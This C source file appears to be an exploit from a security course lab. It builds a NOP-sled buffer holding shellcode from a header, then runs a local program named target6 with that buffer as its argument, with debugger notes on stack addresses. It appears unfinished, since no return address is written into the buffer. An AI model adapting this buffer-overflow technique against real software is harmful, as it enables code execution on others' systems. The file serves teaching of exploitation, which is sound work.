#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

// rip at 0x3021fea8
// p &p : $1 = (char **) 0x3021fe98
// p &q : $2 = (char **) 0x3021fe90

#define TARGET "../targets/target6"
#define NOP 0x90
#define BUFFER_SIZE 200

int main(void)
{
  char * args[3];
  char * env[1];

  char bufferExploit[BUFFER_SIZE];
  memset(bufferExploit, NOP, BUFFER_SIZE);
  memcpy(bufferExploit, shellcode, strlen(shellcode));

  args[0] = TARGET; 
  //args[1] = "hi there"; 
  args[1] = bufferExploit;
  args[2] = NULL;
  
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
